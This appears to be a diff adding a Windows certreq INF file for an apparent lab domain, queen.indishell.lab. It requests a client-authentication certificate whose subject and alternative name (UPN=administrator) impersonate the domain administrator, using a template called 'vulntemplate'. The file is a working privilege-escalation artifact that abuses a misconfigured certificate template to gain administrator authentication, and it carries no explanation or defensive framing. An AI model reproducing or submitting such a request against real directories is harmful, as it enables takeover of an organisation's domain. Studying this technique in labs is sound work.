@@ -1,0 +1,29 @@
+[Version]
+Signature="$Windows NT$"
+
+[NewRequest]
+Subject = "CN=administrator, CN=Users, DC=queen,  DC=indishell, DC=lab"  ; 
+KeySpec = 1
+KeyLength = 2048
+Exportable = TRUE
+ExportableEncrypted = TRUE
+MachineKeySet = FALSE
+ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
+RequestType = PKCS10
+SMIME = FALSE
+FriendlyName = a2
+Silent = True
+
+[EnhancedKeyUsageExtension]
+
+OID=1.3.6.1.5.5.7.3.1 ; Server Authentication
+OID=1.3.6.1.5.5.7.3.2 ; Client Authentication
+
+[Extensions]
+
+2.5.29.17 = "{text}"
+_continue_ = "UPN=administrator"
+
+[RequestAttributes]
+
+CertificateTemplate = vulntemplate; 
